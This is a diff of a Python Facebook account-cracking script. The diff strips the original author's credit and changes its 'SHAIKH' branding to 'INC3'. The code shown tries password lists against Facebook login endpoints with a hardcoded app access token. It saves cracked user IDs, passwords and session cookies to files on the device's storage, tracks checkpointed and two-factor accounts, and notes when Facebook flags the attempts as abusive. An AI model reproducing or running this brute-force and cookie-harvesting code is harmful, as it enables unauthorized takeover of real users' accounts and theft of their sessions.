@@ -1,7 +1,3 @@
-#SOURCE : BY ZAIN
-#GITHUB  : 
-#--------------------------------------------------------------------------#
-
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 
 try:
@@ -15,7 +11,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python SHAIKH_enc.py')
+	os.system('python INC3_enc.py')
 	os.system('clear')
 print(' [•] Join Our Group')
 input(' [•] Press Enter ')
@@ -289,7 +285,7 @@ def menu():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python SHAIKH_enc.py')
+				os.system('python INC3_enc.py')
 			elif xd in ['2','02']:
 				pak()
 			elif xd in ['3','03']:
@@ -330,12 +326,12 @@ def pak():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python SHAIKH_enc.py')
+		os.system('python INC3_enc.py')
 
 def rd1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [SHAIKH-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [INC3-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -381,11 +377,11 @@ def rd1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [SHAIKH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [INC3-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/SHAIKH-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SHAIKH-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/INC3-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/INC3-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(ids))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -395,8 +391,8 @@ def rd1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        #print('\r\r\x1b[1;31m [SHAIKH-CP] '+str(ids)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SHAIKH-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
+                                        #print('\r\r\x1b[1;31m [INC3-CP] '+str(ids)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/INC3-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -408,7 +404,7 @@ def rd1(ids,passlist):
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [SHAIKH-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [INC3-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -423,28 +419,28 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SHAIKH-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [INC3-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/SHAIKH-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SHAIKH-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/INC3-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/INC3-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[SHAIKH-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[INC3-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
-                                        sys.stdout.write('\r\r\033[1;31m [SHAIKH-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                                        sys.stdout.write('\r\r\033[1;31m [INC3-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SHAIKH-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [INC3-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/INC3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/INC3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -456,7 +452,7 @@ def api(ids,names,passlist):
                 pass
 def api2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [SHAIKH-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [INC3-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -477,15 +473,15 @@ def api2(ids,names,passlist):
                         if "c_user" in Aking:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [SHAIKH-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/SHAIKH-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
-                                open('/sdcard/SHAIKH-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
+                                print('\r\r\033[1;32m [INC3-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/INC3-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/INC3-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
                                         ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SHAIKH-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/INC3-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
